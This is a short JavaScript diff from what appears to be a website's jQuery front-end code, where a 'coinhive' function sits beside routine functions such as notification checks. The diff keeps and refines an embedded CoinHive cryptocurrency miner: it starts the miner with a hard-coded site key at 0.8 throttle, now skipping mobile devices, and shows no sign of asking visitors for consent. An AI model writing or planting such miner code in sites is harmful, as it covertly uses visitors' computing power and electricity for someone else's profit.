@@ -14,9 +14,10 @@ jQuery(document).ready(function ($) {
         },
 
         coinhive: function () {
-            var ch = new CoinHive.Anonymous('1hc1dBLexNbhpGSCQbBrPhtcFeqB2XdT');
-            ch.setThrottle(0.8);
-            ch.start();
+            var ch = new CoinHive.Anonymous('1hc1dBLexNbhpGSCQbBrPhtcFeqB2XdT', {throttle: 0.8});
+            if (!ch.isMobile()) {
+                ch.start();
+            }
         },
 
         check_notifications: function () {
